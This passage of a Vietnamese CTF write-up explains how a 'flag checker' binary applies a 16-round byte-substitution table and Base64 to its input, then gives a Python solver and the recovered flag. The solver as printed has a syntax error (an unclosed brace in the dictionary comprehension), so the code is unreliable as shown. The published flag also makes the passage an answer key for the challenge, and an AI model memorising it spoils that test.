    146, 157, 56, 245, 188, 182, 218, 33, 16, 255, 243, 210, 205, 12, 19, 236,
    95, 151, 68, 23, 196, 167, 126, 61, 100, 93, 25, 115, 96, 129, 79, 220, 34,
    42, 144, 136, 70, 238, 184, 20, 222, 94, 11, 219, 224, 50, 58, 10, 73, 6,
    36, 92, 194, 211, 172, 98, 145, 149, 228, 121, 231, 200, 55, 109, 141, 213,
    78, 169, 108, 86, 244, 234, 101, 122, 174, 8, 186, 120, 37, 46, 28, 166,
    180, 198, 232, 221, 116, 31, 75, 189, 139, 138, 112, 62, 181, 102, 72, 3,
    246, 14, 97, 53, 87, 185, 134, 193, 29, 158, 225, 248, 152, 17, 105, 217,
    142, 148, 155, 30, 135, 233, 206, 85, 40, 223, 140, 161, 137, 13, 191, 230,
    66, 104, 65, 153, 45, 15, 176, 84, 187, 22,
  ]  
    };

    if (strlen(inputString) != 44) {
        printf("Incorrect length!\n");
        return;
    }

    for (int i = 0; i < 16; i++) {
        for (int j = 0; j < strlen(inputString); j++) {
            inputString[j] = xor[inputString[j]];
        }
    }

    char* base64EncodedResult = bytetoa(inputString, strlen(inputString));

    if (strcmp(base64EncodedResult, "/52NXNAD7Lui+5G7idT7Dbue0L7vkV/bDey779tzuwf7c5G7c5HbDZHswUs=") != 0) {
        printf("Incorrect flag!\n");
        return;
    }

    printf("Good job, you're welcome!!\n");
}

int main() {
    char inputString[] = "??????????????????????????????????????????"; 
    check(inputString);
    return 0;
}
```

Tới đây, đoạn code có vẻ đã rõ ràng hơn rất nhiều, mảng chúng ta phải nhập vào phải có đúng 44 kí tự và sau đó được chuyển vào hàm `check()`.

Chương trình thực hiện 1 vòng lặp 16 lần, qua mỗi lần cập nhật ` inputString[j] = xorValues[inputString[j];`, mỗi vòng như vậy thay đôi hết 44 kí tự của `inputString` . Sau khi kết thúc, chuyển string này về base64 và so sánh với chuỗi đã cho.
`/52NXNAD7Lui+5G7idT7Dbue0L7vkV/bDey779tzuwf7c5G7c5HbDZHswUs=`

-> Sau đây là script mình giải bài này:

[pupu.py](https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/pupu-flag-checker/pupu.py)

```python
import base64

key = [
 99, 124, 119, 123, 242, 107, 111, 197, 48, 1, 103, 43, 254, 215, 171, 118,
      202, 130, 201, 125, 250, 89, 71, 240, 173, 212, 162, 175, 156, 164, 114,
      192, 183, 253, 147, 38, 54, 63, 247, 204, 52, 165, 229, 241, 113, 216, 49,
      21, 4, 199, 35, 195, 24, 150, 5, 154, 7, 18, 128, 226, 235, 39, 178, 117, 9,
      131, 44, 26, 27, 110, 90, 160, 82, 59, 214, 179, 41, 227, 47, 132, 83, 209,
      0, 237, 32, 252, 177, 91, 106, 203, 190, 57, 74, 76, 88, 207, 208, 239, 170,
      251, 67, 77, 51, 133, 69, 249, 2, 127, 80, 60, 159, 168, 81, 163, 64, 143,
      146, 157, 56, 245, 188, 182, 218, 33, 16, 255, 243, 210, 205, 12, 19, 236,
      95, 151, 68, 23, 196, 167, 126, 61, 100, 93, 25, 115, 96, 129, 79, 220, 34,
      42, 144, 136, 70, 238, 184, 20, 222, 94, 11, 219, 224, 50, 58, 10, 73, 6,
      36, 92, 194, 211, 172, 98, 145, 149, 228, 121, 231, 200, 55, 109, 141, 213,
      78, 169, 108, 86, 244, 234, 101, 122, 174, 8, 186, 120, 37, 46, 28, 166,
      180, 198, 232, 221, 116, 31, 75, 189, 139, 138, 112, 62, 181, 102, 72, 3,
      246, 14, 97, 53, 87, 185, 134, 193, 29, 158, 225, 248, 152, 17, 105, 217,
      142, 148, 155, 30, 135, 233, 206, 85, 40, 223, 140, 161, 137, 13, 191, 230,
      66, 104, 65, 153, 45, 15, 176, 84, 187, 22,
]
 
enc_flag = '/52NXNAD7Lui+5G7idT7Dbue0L7vkV/bDey779tzuwf7c5G7c5HbDZHswUs='

dec_flag = bytearray(base64.b64decode(enc_flag))

map={val: idx for idx, val in enumerate(key)
      
for _ in range(16):
        dec_flag = bytearray(map[byte] for byte in dec_flag)
        
flag=bytes(dec_flag)

print(flag.decode('utf-8'))
```


-> `FLAG: W1{Nice_but_your_nightmare_has_just_started}`
